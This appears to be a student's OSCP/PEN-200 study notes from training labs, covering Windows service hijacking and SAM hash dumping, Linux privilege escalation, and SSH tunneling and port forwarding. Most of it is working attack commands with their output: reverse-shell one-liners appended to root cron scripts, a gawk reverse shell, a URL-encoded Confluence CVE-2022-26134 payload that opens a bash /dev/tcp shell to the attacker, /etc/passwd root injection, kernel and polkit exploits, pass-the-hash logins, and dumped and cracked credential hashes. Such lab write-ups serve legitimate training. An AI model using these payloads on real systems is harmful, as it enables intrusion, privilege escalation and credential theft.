kali>nc -nlvp 1212
PS alex C:\Services> iwr -uri http://192.168.45.208:1234/EnterpriseServiceOptional.dll -Outfile EnterpriseServiceOptional.dll
PS>Restart-Service EnterpriceService
kali>nc -nlvp 1212
#Got shell back in netcal with enterpriseuser 
PS enterpriseuser > mkdir C:\Temp
PS enterpriseuser > reg save hklm\sam c:\Temp\sam
PS enterpriseuser > reg save hklm\system c:\Temp\system
kali>sudo service ssh start (Transfer file windows to kali)
PS alex user>scp sam kali@192.168.45.208:/home/kali/Desktop/HTB/OSCP(Windows)
PS alex user>scp system kali@192.168.45.208:/home/kali/Desktop/HTB/OSCP
# Command
PS C:\> dir \Temp
dir \Temp
    Directory: C:\Temp
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          4/7/2024   4:03 PM          65536 sam                                                                  
-a----          4/7/2024   4:04 PM       12488704 system  
# Kali
kali─$ pypykatz registry --sam sam system 
WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
============== SYSTEM hive secrets ==============
CurrentControlSet: ControlSet001
Boot Key: b4999e49259682622dcc1e3a1636ff45
============== SAM hive secrets ==============
HBoot Key: b347a868b15e47fec2f6fac8003d7ef910101010101010101010101010101010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f518eb35353d7a83d27e7fe457664e5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:856f13362db36284f7d964120d794a98:::
enterpriseadmin:1001:aad3b435b51404eeaad3b435b51404ee:d94267c350fc02154f2aff04d384b354:::
diana:1002:aad3b435b51404eeaad3b435b51404ee:3f2e7dddbe7a42d8978c1689b67297f3:::
alex:1003:aad3b435b51404eeaad3b435b51404ee:821036ef8b6f43194779f6fca426f3f7:::
enterpriseuser:1004:aad3b435b51404eeaad3b435b51404ee:b875ee792421982ebcfa8217340ef376:::
offsec:1005:aad3b435b51404eeaad3b435b51404ee:d2ce08a1ee362158863d47d478b2622e:::
-----------------------------------------------------------------
>evil-winrm -i 192.168.204.222 -u enterpriseadmin -H "d94267c350fc02154f2aff04d384b354"(#No Successful)
>evil-winrm -i 192.168.204.222 -u Administrator -H "8f518eb35353d7a83d27e7fe457664e5"
```

# 17 Linux Privilege Escalation

- Enumerating Linux
- Exposed Confidential Information
- Insecure File Permissions
- Abusing System Linux components

## Enumerating Linux

- Understand files and users privileges on Linux
- Perform manual enumeration
- Conduct automated enumeration

### Understanding Files and Users Privileges on Linux

Every file (and by extension every element of a Linux system) abides by user and group permissions based on three primary properties: *read* (symbolized by **r**), *write* (symbolized by **w**), and *execute* (symbolized by **x**). Each file or directory has specific permissions for three categories of users: the *owner*, the *owner group* and *others group.*

### Manual Enumeration

Manually enumerating Linux systems can be time consuming. However, this approach allows for a more controlled outcome because it helps identify more peculiar privilege escalation methods that are often overlooked by automated tools.

```markdown
>ssh joe@192.168.204.214 (# password-offsec)
>id
>cat /etc/passwd
>hostname
>cat /etc/issue
>cat /etc/os-release
>uname -a
>ps aux
>ip a or ifconfig
>routel or route
>ss -anp or netstat -anp
>cat /etc/iptables/rules.v4
>ls -lah /etc/cron*
>crontab -l
>sudo crontab -l
>dpkg -l or rpm
>find / -writable -type d 2>/dev/null
>cat /etc/fstab 
>mount
>lsblk
>lsmod
>/sbin/modinfo liata (# libata found in the above command)
>find / -perm -u=s -type f 2>/dev/null
>strings file_read(#found flag)
```

### Automated Enumeration

```markdown
>wget http://192.168.45.208:1234/unix-privesc-check
>scp /bin/unix-privesc-check joe@192.168.212.214:/home/joe/ (#copying kali linux to linux)
>./unix-privesc-check > output.txt (# clue world-writable)
>cat /etc/sudoers 
```

## Exposed Confidential Information

### Inspecting User Trails

```markdown
target> cat .bashrc (#password will be stored in export SCRIPT_CREDENTIALS="lab")
kali>crunch 6 6 Lab%%% > wordlist
target>hydra -l eve -P wordlist 192.168.213.214 -t 4 ssh -V (#Password-Lab123)
# Another Part
>watch -n 1 "ps -aux | grep pass"
>sudo tcpdump -i lo -A | grep "pass"
```

## Insecure File Permissions

### Abusing Cron Jobs

In order to leverage insecure file permissions, we must locate an executable file that not only allows us write access, but also runs at an elevated privilege level. On a Linux system, the cron[1](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/linux-privilege-escalation/insecure-file-permissions/abusing-cron-jobs#fn1) time-based job scheduler is a prime target, since system-level scheduled jobs are executed with root user privileges and system administrators often create scripts for **cron** jobs with insecure permissions.

```markdown
>grep "CRON" /var/log/syslog (# FInd scheduled task running on which if root user running insert rev shell)
>cat /home/joe/.scripts/user_backups.sh
>ls -lah /home/joe/.scripts/user_backups.sh(# which user owned file)
>cd .scripts
echo >> user_backups.sh
>echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <KALI IP> 1234 >/tmp/f" >> user_backups.sh
>cat user_backups.sh
kali> nc -nlvp 1212 (#First Listener)
```

### Abusing Password Authentication

Let's demonstrate this. In a previous section, we showed that our Debian client may be vulnerable to privilege escalation due to the fact that the **/etc/passwd** permissions were not set correctly. To escalate our privileges, let's add another superuser (root2) and the corresponding password hash to **/etc/passwd**. We will first generate the password hash using the **openssl**[1](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/linux-privilege-escalation/insecure-file-permissions/abusing-password-authentication#fn1) tool and the **passwd** argument. By default, if no other option is specified, openssl will generate a hash using the *crypt algorithm*,[2](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/linux-privilege-escalation/insecure-file-permissions/abusing-password-authentication#fn2) a supported hashing mechanism for Linux authentication.

```markdown
>openssl passwd w00t (Generate password using crypt algorithm)
Fdzt.eqJQ4s0g
>echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
>su root2
ENter the password in the terminal : w00t
>id (UID=0, gid=0)
```

## Insecure System Components

### Abusing Setuid Binaries and Capabilities (sudo -l apt-get)

Before attempting the actual exploitation technique, let's review the purpose behind a setuid binary using a brief example. When a user or a system-automated script launches a process, it inherits the UID/GID of its initiating script: this is known as the real UID/GID.

```markdown
>passwd
>ps u -C passwd (# find out the above process id when in the active state, this process is running root user)
>grep Uid /proc/1932/status (Uid:	1000	0	0	0-Real Uid then root user uid)
>ls -asl /usr/bin/passwd(# SUID bit set)
>find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
>whoami (# will get root)
>exit
>/usr/sbin/getcap -r / 2>/dev/null (#FInd suid bits)
>perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";' (# Above has suid setcommand reveals perl )
>id (# will get root)

# another lab
>sudo -l
#Matching Defaults entries for joe on debian-privesc:
#env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
#User joe may run the following commands on debian-privesc:
#    (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
>sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

### Abusing Sudo

On UNIX systems, the *sudo*[1](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/linux-privilege-escalation/insecure-system-components/abusing-sudo#fn1) utility can be used to execute a command with elevated privileges. To be able to use sudo, our low-privileged user account must be a member of the sudo group (on Debian based Linux distributions). The word "sudo" stands for "**Superuser-Do**", and we can think of it as changing the effective user-id of the executed command.

```markdown
>sudo -l (#(ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get)
>COMMAND='id'(#From Gtfobins)
>TF=$(mktemp)
>echo "$COMMAND" > $TF
>chmod +x $TF
>sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root (#INterupted in between)
>cat /var/log/syslog | grep tcpdump (#Aug 29 02:52:14 debian-privesc kernel: [ 5742.171462] audit: type=1400 audit(1661759534.607:27): **apparmor(AppArmor is a kernel module that provides mandatory access control (MAC) on Linux systems)**="DENIED" operation="exec" profile="/usr/sbin/tcpdump" name="/tmp/tmp.c5hrJ5UrsF" pid=12280 comm="tcpdump" requested_mask="x" denied_mask="x" fsuid=0 ouid=1000)
>su - root
>aa-status(#tcpdump is protected by AppArmor)
>sudo apt-get changelog apt (Get root)
!#/bin/sh
```

### Exploiting Kernel Vulnerabilities

Kernel exploits are an excellent way to escalate privileges, but our success may depend on matching not only the target's kernel version, but also the operating system flavor, such as Debian, RHEL, Gentoo, etc.

```markdown
>cat /etc/issue (Ubuntu 16.04.4 LTS \n \l)
>uname -a Linux ubuntu-privesc 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
>arch (X86_64)
kali>searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
kali>cp /usr/share/exploitdb/exploits/linux/local/45010.c .
kali>head 45010.c -n 20
kali>mv 45010.c cve-2017-16995.c
kali>scp cve-2017-16995.c joe@192.168.123.216: (Transfer target machine)
>gcc cve-2017-16995.c -o cve-2017-16995
>file cve-2017-16995
>./cve-2017-16995(GOt shell)
```

### Capstone Linux - SUID - /usr/lib/policykit-1/polkit-agent-helper-1

```markdown
>find / -perm -u=s -type f 2>/dev/null (# First identified SUID then followed by one by one)
#First i tried with snap(dirty_sock, user is not created, tried only dirty_sock2)
#Moved next one polkit(Ploicykit), https://github.com/ryaagard/CVE-2021-4034/tree/main
>joe@ubuntu-privesc:~$ gcc -shared -o evil.so -fPIC evil-so.c 
evil-so.c: In function ‘gconv_init’:
evil-so.c:10:5: warning: implicit declaration of function ‘setgroups’ [-Wimplicit-function-declaration]
     setgroups(0);
     ^
evil-so.c:12:5: warning: null argument where non-null required (argument 2) [-Wnonnull]
     execve("/bin/sh", NULL, NULL);
>joe@ubuntu-privesc:~$ gcc exploit.c -o exploit
exploit.c: In function ‘main’:
exploit.c:25:5: warning: implicit declaration of function ‘execve’ [-Wimplicit-function-declaration]
     execve(BIN, argv, envp);
     ^
>joe@ubuntu-privesc:~$ ls
dirty_sockv2.py  evil.so  evil-so.c  exploit  exploit.c
#Their is some compliation issues but still i got root shell
>joe@ubuntu-privesc:~$ ./exploit 
># id
uid=0(root) gid=0(root) groups=0(root)
># pwd
/home/joe
# Another explot is working 
```

### Capstone Linux SSH - cron archiver

```markdown
>ls -lah /etc/cron*(#Found archiver)
>ls -l /var/archives/   (# Found SH file with write permission)                                                                                                                                                                 
-rwxrwxrwx 1 root root 159 Nov 15  2021 archive.sh
# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <KALI IP> 1234 >/tmp/f (Adding it end of the file archive.sh)
kali>nc -nlvp 1234 (# got root shell)
```

### Capstone Linux SSH - File permissions -/etc/passwd

```markdown
>ls -l /etc/passwd
-rw-rw-rw- 1 root root 1370 Apr 12 16:44 /etc/passwd (#Write permission)
>openssl passwd ashok
DLYJ9ZDE6uY5o
>echo "ashok:DLYJ9ZDE6uY5o:0:0:root:/root:/bin/bash" >> /etc/passwd
>su ashok(#password is also ashok, switch directory to ashok get the flag)
```

### Capstone Linux SSH - File permissions - gawk

```markdown
>find / -perm -u=s -type f 2>/dev/null (# Found gawk) 
#https://ihsansencan.github.io/privilege-escalation/linux/binaries/gawk.html
#oneway
>gawk 'BEGIN {system("/bin/sh")}' (# Directly get root shell)
#Anotherway
>gawk -v RHOST=192.168.45.158 -v RPORT=1122 'BEGIN {s = "/inet/tcp/0/" RHOST "/" RPORT; while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break; while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
>nc -nlvp 1122 (#got root shell, Try with id, whoami commands)
>cat /root/flag.txt
```

# 18.Port Redirection and SSH Tunneling

Port Fording and SSH Tunneling on *NIX and Windows Machines.

## Why Port Redirection and Tunneling ?

- **Flat Network:** In a flat network, all devices can communicate freely with each other, posing security risks as attackers can easily spread through the network once they gain access to a single host.
- **Segmentation and Subnetting:** Segmented networks are divided into smaller subnets, each serving a specific purpose. Devices within a subnet have limited access to other subnets, enhancing network security and limiting the impact of potential breaches.
- **Firewalls:** Firewalls are crucial for enforcing network security policies, controlling traffic flow, and blocking potentially malicious activities. They can be implemented at various levels, including endpoint software and physical network infrastructure.
- **Port Redirection:** Port redirection, or port forwarding, involves redirecting data flow from one socket to another. It enables traversal of network boundaries and is often used to expose services to the internet or bypass firewall restrictions.
- **SSH Tunneling:** SSH tunneling involves encapsulating one type of data stream within another, such as transporting HTTP traffic within an SSH connection. It provides a secure way to bypass network restrictions and encrypt communication.
- **Learning Objectives:** The learning unit covers understanding different network layouts, considering the impact of network security devices, and knowing when to use port redirection and tunneling techniques.

## Port Forwarding with Linux Tools - Socat-CVE-2022-26134

![Untitled](Untitled%2075.png)

Kali -            192.168.45.158 ([Rapid7 payload](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) )

Confluence-192.168.212.63

PG-              10.4.212.215

```markdown
kali>curl http://192.168.212.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.158/4444%200%3E%261%27%29.start%28%29%22%29%7D/
kali>nc -nlvp 4444
>cat /var/atlassian/application-data/confluence/confluence.cfg.xml(user/pass-postgres/D@t4basePassw0rd!)
confluence> socat -ddd TCP-LISTEN:2345,fork TCP:10.4.212.215:5432(Terminal)
kali new> psql -h 192.168.212.63 -p 2345 -U postgres
>>\l (Give 4 databased)
>>\c confluence (selected confluence database)
>>SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'; (cwr_user)
>>select * from cwd_user;
 id     |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
--------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
 229377 | admin          | admin           | T      | 2022-09-09 21:10:26.365 | 2022-09-09 21:10:26.365 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | d9da2333-8bd1-4a8e-82d3-0613aead5d22 |        98305 | {PKCS5S2}3vfgC35A7Gnrxlzbvp32yM8zXvdE8U8bxS9bkP+3aS3rnSJxz4bJ6wqtE8d95ejA
 229378 | trouble        | trouble         | T      | 2022-09-09 21:13:04.598 | 2022-09-09 21:13:04.598 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 84bcf8cf-618d-4bec-b5c0-1b4a21fbcd6b |        98305 | {PKCS5S2}tnbti4h38VDOh0xPrBHr7JBYjev7wws+ETHL1YyjSpIWVUz+66zXwDvbBJkJz342
 229379 | happiness      | happiness       | T      | 2022-09-09 21:13:35.831 | 2022-09-09 21:13:35.831 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | 8b9c660a-cfee-48ac-8214-737df1786dd2 |        98305 | {PKCS5S2}1hCLEv054BGYa9QkCAZKSmotKb4d8WbuDc/gGxHngs0cL3+fJ4OmCt6+fUM6HYlc
 229380 | hr_admin       | hr_admin        | T      | 2022-09-09 21:13:58.548 | 2022-09-09 21:13:58.548 | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 0d31acb5-ba51-4725-ae64-ae7f5d51becc |        98305 | {PKCS5S2}aBZZw3HfmgYN3Dzg/Pg7GjagLdo+eRg+0JCCVId/KyNT4oVlNbhWPJtJNazs4F5R
 229381 | database_admin | database_admin  | T      | 2022-09-09 21:14:22.459 | 2022-09-09 21:14:22.459 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 93d97033-f7d4-4a3c-80f4-55cc5faf03c7 |        98305 | {PKCS5S2}ueMu+nTGBtfeGXGBlXXFcJLdSF4uVHkZxMQ1Bst8wm3uhZcDs56a2ProZiSOk2hv
 229382 | rdp_admin      | rdp_admin       | T      | 2022-09-09 21:14:46.153 | 2022-09-09 21:14:46.153 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | a8f8d9b5-dfcb-480b-b461-8efce939294c |        98305 | {PKCS5S2}vCcYx3LxTYB2KH2Sq4wLNLdAcS+4lX/yTQrvBJngifUEXcnIUHEwW0YnOe86W8tP
{PKCS5S2}3vfgC35A7Gnrxlzbvp32yM8zXvdE8U8bxS9bkP+3aS3rnSJxz4bJ6wqtE8d95ejA
{PKCS5S2}tnbti4h38VDOh0xPrBHr7JBYjev7wws+ETHL1YyjSpIWVUz+66zXwDvbBJkJz342
{PKCS5S2}1hCLEv054BGYa9QkCAZKSmotKb4d8WbuDc/gGxHngs0cL3+fJ4OmCt6+fUM6HYlc
{PKCS5S2}aBZZw3HfmgYN3Dzg/Pg7GjagLdo+eRg+0JCCVId/KyNT4oVlNbhWPJtJNazs4F5R
{PKCS5S2}ueMu+nTGBtfeGXGBlXXFcJLdSF4uVHkZxMQ1Bst8wm3uhZcDs56a2ProZiSOk2hv
{PKCS5S2}vCcYx3LxTYB2KH2Sq4wLNLdAcS+4lX/yTQrvBJngifUEXcnIUHEwW0YnOe86W8tP
#Identified Hashes
#{PKCS5S2}aBZZw3HfmgYN3Dzg/Pg7GjagLdo+eRg+0JCCVId/KyNT4oVlNbhWPJtJNazs4F5R:Welcome1234
#{PKCS5S2}vCcYx3LxTYB2KH2Sq4wLNLdAcS+4lX/yTQrvBJngifUEXcnIUHEwW0YnOe86W8tP:P@ssw0rd!
#{PKCS5S2}ueMu+nTGBtfeGXGBlXXFcJLdSF4uVHkZxMQ1Bst8wm3uhZcDs56a2ProZiSOk2hv:sqlpass123
confluence>socat TCP-LISTEN:2222,fork TCP:10.4.212.215:22 (Close exiting port forwarding)
kali>ssh database_admin@192.168.212.63 -p2222(#password-sqlpass123)
find flag on /tmp/socat_flag.txt
```

## SSH Tunneling

### SSH Local Port Forwarding - CVE-2022-26134

![Untitled](Untitled%2076.png)

Kali                        - 192.168.45.158

Confluence            - 192.168.212.63

PGDATABASE1 OS - 10.4.212.215

HRSHARES OS       - 172.16.212.217 - Same like previous but socat tool is not available

```markdown
>kali>curl http://192.168.212.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.158/4444%200%3E%261%27%29.start%28%29%22%29%7D/
>nc -nlvp 4444 (#user/pass-postgres/D@t4basePassw0rd!)
confluence>python3 -c 'import pty; pty.spawn("/bin/bash")'
confluence>ssh database_admin@10.4.212.215 (#password-sqlpass123, then logging to PGDATABSE01)
PGDATABASE1-ssh>ip addr, ip route
#172.16.212.0/24 dev ens224 proto kernel scope link src 172.16.50.215 
#172.16.212.0/24 via 172.16.50.254 dev ens224 proto static
PGDATABASE1-ssh>for i in $(seq 1 254); do nc -zv -w 1 172.16.212.$i 445; done
#Connection to 172.16.212.217 445 port [tcp/microsoft-ds] succeeded!
>kali>curl http://192.168.212.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.158/8888%200%3E%261%27%29.start%28%29%22%29%7D/
>nc -nlvp 8888 (#user/pass-postgres/D@t4basePassw0rd!), #Caution port changed
confluence>ssh -N -L 0.0.0.0:4455:172.16.212.217:445 database_admin@10.4.50.215(#password-sqlpass123, -N to prevent a shell from being opened.)
confluence>ss -ntplu
kali>smbclient -p 4455 -L //192.168.212.63/ -U hr_admin --password=Welcome1234
#Listed shares
kali>smbclient -p 4455 //192.168.212.63/scripts -U hr_admin --password=Welcome1234
>ls
>get Provisioning.ps1 (#It will be downloaded check the flag)
```

Kali                        - 192.168.45.158

Confluence            - 192.168.182.63

PGDATABASE1 OS - 10.4.182.215

HRSHARES OS       - 172.16.182.217

```markdown
#Start VM Group 2. A server is running on HRSHARES port 4242. Download the ssh_local_client 
#binary from http://CONFLUENCE01:8090/exercises/ssh_local_client. Create an SSH local port for
#ward on CONFLUENCE01, which will let you run the ssh_local_client from your Kali machine 
#against the server on HRSHARES and retrieve the flag.
#Note: the source files used to build the ssh_local_client binary can be downloaded from 
#/exercises/client_source.zip.
kali>curl http://192.168.182.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.158/4444%200%3E%261%27%29.start%28%29%22%29%7D/
>nc -nlvp 4444
confluence>python3 -c 'import pty; pty.spawn("/bin/bash")'
confluence>ssh database_admin@10.4.182.215
PGDATABASE1-ssh>for i in $(seq 1 254); do nc -zv -w 1 172.16.182.$i 4242; done
confluence>ssh -N -L 0.0.0.0:4455:172.16.182.217:4242 database_admin@10.4.182.215
#http://CONFLUENCE01:8090/exercises/ssh_local_client (#ssh_local_client downloaded)
kali>./ssh_local_client -i 192.168.182.63 -p 4455
#Connecting to 192.168.182.63:4455
#Flag: "OS{e27478997967d5fdf5ea53b1d9fb683f}"
```

### SSH Dynamic Port Forwarding

Local port forwarding has one glaring limitation: we can only connect to one socket per SSH connection. This can make it quite tedious to use at scale. Luckily, OpenSSH also provides *dynamic port forwarding*.[1](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/port-redirection-and-ssh-tunneling/ssh-tunneling/ssh-dynamic-port-forwarding#fn1) From a single listening port on the SSH client, packets can be forwarded to any socket that the SSH server host has access to.

![Untitled](Untitled%2077.png)

Kali                        - 192.168.45.158

Confluence            - 192.168.203.63

PGDATABASE1 OS - 10.4.203.215

HRSHARES OS       - 172.16.203.217

```markdown
kali>curl -v http://192.168.203.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.158/4444%200%3E%261%27%29.start%28%29%22%29%7D/
>nc -nlvp 4444
confluence>python3 -c 'import pty; pty.spawn("/bin/bash")'
confluence>python3 -c 'import pty; pty.spawn("/bin/sh")' (#No tty shell)
confluence>ssh -N -D 0.0.0.0:9999 database_admin@10.4.203.215
kali>tail /etc/proxychains4.conf (socks5 192.168.50.63 9999)
#socks5 192.168.50.63 9999 add this line
kali>proxychains smbclient -L //172.16.203.217/ -U hr_admin --password=Welcome1234
kali>proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
kali>proxychains ./ssh_dynamic_client -i 172.16.203.217 -p 4872 (#executable ssh_dynamic_client ****given by lab it self)
#Got flag shell closed
```

### SSH Remote Port Forwarding

 In our examples so far, we've been able to connect to any port we bind on the WAN interface of CONFLUENCE01. This is more challenging in the real world because, more often than not, firewalls - both hardware and software - are likely to get in the way. Inbound traffic is often controlled much more aggressively than *outbound* traffic. Only in rare cases will we compromise credentials for an SSH user, allowing us to SSH directly into a network and port forward. We will only very rarely be able to access ports that we bind to a network perimeter.
This is where SSH *remote port forwarding*[1](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/port-redirection-and-ssh-tunneling/ssh-tunneling/ssh-remote-port-forwarding#fn1) can be extremely useful. In a similar way that an attacker may execute a remote shell payload to connect back to an attacker-controlled listener, SSH remote port forwarding can be used to connect back to an attacker-controlled SSH server, and bind the listening port there. We can think of it like a reverse shell, but for port forwarding.

![Untitled](Untitled%2078.png)

**192.168.186.63 - Confluence01 OS,** 192.168.45.191 - kali OS

**10.4.186.215     - PGDATABASE01 OS**

```markdown
kali>curl -v http://192.168.186.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.191/4444%200%3E%261%27%29.start%28%29%22%29%7D/
>nc -nlvp 4444
confluence>python3 -c 'import pty; pty.spawn("/bin/bash")'
confluence>python3 -c 'import pty; pty.spawn("/bin/sh")' (#No tty shell)
kali>sudo service ssh start
kali>sudo ss -ntplu (#check the port 22 avaialble or not)
confluence>ssh -N -R 127.0.0.1:2345:10.4.186.215:5432 kali@192.168.45.191
kali>sudo ss -ntplu(#check the port 2345 avaialble or not)
kali>psql -h 127.0.0.1 -p 2345 -U postgres(#user/pass-postgres/D@t4basePassw0rd!)
>\l
>\c hr_backup
>SELECT table_name FROM information_schema.tables;
>select * from payroll;(# Find the flag)
# Another Machine
kali>curl -v http://192.168.186.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.191/1122%200%3E%261%27%29.start%28%29%22%29%7D/
>nc -nlvp 1122
confluence>python3 -c 'import pty; pty.spawn("/bin/bash")'
confluence>python3 -c 'import pty; pty.spawn("/bin/sh")' (#No tty shell)(#user/pass-postgres/D@t4basePassw0rd!)
kali>sudo systemctl start ssh
kali>sudo ss -ntplu (#check the port 22 avaialble or not)
confluence>ssh -N -R 127.0.0.1:4444:10.4.186.215:4444 kali@192.168.45.191
>chmod +x **ssh_remote_client** (**ssh_remote_client** file is downloaded from given question)
>./ssh_remote_client -i 127.0.0.1 -p 4444 (#Got flag)
```

### SSH Remote Dynamic Port Forwarding

With remote port forwarding, we were able to forward packets to one socket per SSH connection. However, just as we found with local port forwarding, this single-socket-per-connection limitation can slow us down. We often want more flexibility when attacking networks, especially in the enumeration stages.

Luckily, *remote dynamic port forwarding*[1](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/port-redirection-and-ssh-tunneling/ssh-tunneling/ssh-remote-dynamic-port-forwarding#fn1) can provide this flexibility. Just as the name suggests, remote dynamic port forwarding creates a *dynamic port forward* in the *remote* configuration. The SOCKS proxy port is *bound to the SSH server*, and traffic is *forwarded from the SSH client*.

![Untitled](Untitled%2079.png)

192.168.186.63 - Confluence01,     192.168.45.191 -Kali OS,

 ****10.4.186.215 - PGDATABSE01 OS, 192.168.186.64 - MULTISERVER03 OS

```markdown
kali>curl -v http://192.168.186.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.191/1122%200%3E%261%27%29.start%28%29%22%29%7D/
>nc -nlvp 1122
confluence>python3 -c 'import pty; pty.spawn("/bin/sh")'
kali>sudo systemctl start ssh
kali>sudo ss -ntplu
confluence>ssh -N -R 9998 kali@192.168.45.191 (#Enter kali OS password)
kali>sudo ss -ntplu
kali>sudo nano /etc/proxychains4.conf (socks5 127.0.0.1 9998)
#socks5 127.0.0.1 9998 add this end
kali>tail /etc/proxychains4.conf 
kali>proxychains nmap -vvv -sT -Pn 10.4.186.64 -p 9000-9100 (#open port 9062)
#ssh_remote_dynamic_client download this file from given question
kali>chmod +x ssh_remote_dynamic_client
kali>proxychains ./ssh_remote_dynamic_client  -i 10.4.186.64 -p 9062 (#Found flag)
```

### Using sshuttle

In situations where we have direct access to an SSH server, behind which is a more complex internal network, classic dynamic port forwarding might be difficult to manage. *sshuttle*[1](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/port-redirection-and-ssh-tunneling/ssh-tunneling/using-sshuttle#fn1) is a tool that turns an SSH connection into something similar to a VPN by setting up local routes that force traffic through the SSH tunnel. However, it requires root privileges on the SSH client and Python3 on the SSH server, so it's not always the most lightweight option. In the appropriate scenario, however, it can be very useful.
192.168.186.63 - Confluence01 OS, 192.168.45.191 - kali OS

10.4.186.215     - PGDATABASE01 OS, 172.16.186.217 - HRDHARES OS

```markdown
kali>curl -v http://192.168.186.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.191/1122%200%3E%261%27%29.start%28%29%22%29%7D/
>nc -nlvp 1122
confluence>python3 -c 'import pty; pty.spawn("/bin/sh")'
confluence>socat TCP-LISTEN:2222,fork TCP:10.4.186.215:22
kali>sshuttle -r database_admin@192.168.186.63:2222 10.4.186.0/24 172.16.186.0/24
kali>smbclient -L ////172.16.186.217 -U hr_admin --password=Welcome1234
kali>smbclient //172.16.186.217/scripts -U hr_admin --password=Welcome1234
>get Provisioning.ps1
```

## Port Forwarding with Windows Tools

Their are many ways windows, transfer through ssh we see some of tools

### ssh.exe

